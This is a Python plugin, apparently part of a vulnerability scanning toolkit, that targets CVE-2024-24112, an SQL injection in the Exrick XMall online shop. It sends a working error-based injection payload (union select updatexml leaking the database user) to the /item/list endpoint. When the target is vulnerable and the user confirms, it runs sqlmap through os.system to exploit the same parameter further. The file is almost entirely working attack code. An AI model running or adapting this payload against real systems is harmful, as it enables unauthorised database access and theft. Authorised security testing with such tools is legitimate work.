#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_24112:
    def get_url(self,input_url):
        try:
            url = input_url + "/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "XPATH" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Exrick", '目标存在CVE-2024-24112 SQL漏洞')
                    OutPrintInfo("Exrick", url)
                else:
                    OutPrintInfoSuc("Exrick", f'目标存在CVE-2024-24112 SQL漏洞: {url}')
                    OutPutFile("exrick_2024_24112.txt",f'目标存在CVE-2024-24112 SQL漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Exrick", f'目标 {input_url} 目标不存在CVE-2024-24112 SQL漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Exrick",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Exrick", '开始检测Exrick XMall开源商城SQL注入漏洞...')
        if self.get_url(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,*,0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136" --output-dir={dir}/result/ --batch')
                        os.system(f"sqlmap -u \"{url}/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,*,0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("Exrick", 'Exrick XMall开源商城SQL注入漏洞检测结束')

